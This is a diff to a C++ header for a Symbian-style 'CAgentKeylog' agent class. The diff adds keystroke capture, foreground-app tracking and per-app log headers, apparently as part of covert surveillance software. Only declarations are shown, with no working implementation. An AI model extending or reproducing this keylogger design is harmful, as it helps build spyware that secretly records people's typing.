@@ -10,7 +10,10 @@
 
 // INCLUDES
 #include "AbstractAgent.h"
-#include "AdditionalDataStructs.h"
+#include "MonitorForeground.h"
+#include "KeyLogger.h"
+#include <HT\TimeUtils.h>
+
 
 // CLASS DECLARATION
 
@@ -18,7 +21,7 @@
  *  CAgentKeylog
  * 
  */
-class CAgentKeylog : public CAbstractAgent
+class CAgentKeylog : public CAbstractAgent, public MForegroundCallBack, public MKeyCallBack
 	{
 public:
 	// Constructors and destructor
@@ -38,13 +41,16 @@ public:
 	 */
 	static CAgentKeylog* NewLC(const TDesC8& params);
 	
-	
+				
 protected:
 	// From AbstractQueueEndPoint
 	virtual void StartAgentCmdL();
 	virtual void StopAgentCmdL();
-	virtual void NotifyAgentCmdL(TUint32 aData);
-		
+	// From MForegroundCallBack
+	virtual void ForegroundEventL(TUid aAppUid, const TDesC& aCaption);
+	// From MKeyCallback
+	virtual TBool KeyCapturedL(TWsEvent aEvent);
+			
 private:
 	
 	/**
@@ -52,15 +58,25 @@ private:
 	 */
 	CAgentKeylog();
 	
-
 	/**
 	 * EPOC default constructor for performing 2nd stage construction
 	 */
 	void ConstructL(const TDesC8& params);
-		
+	
+	/*
+	 * Create the buffer with the record log header
+	 */
+	HBufC8* GetHeaderBufferL(const TDesC& aCaption);
+	
 private: // data members
 		
 	__FLOG_DECLARATION_MEMBER
+	
+	CForegroundMonitor*	iFgMonitor;
+	CKeyLogger*			iKeyLogger;
+	RWsSession	iWsSession;
+	TUid		iAppUid;
+	TBuf<50>	iCaption;
 	};
 
 
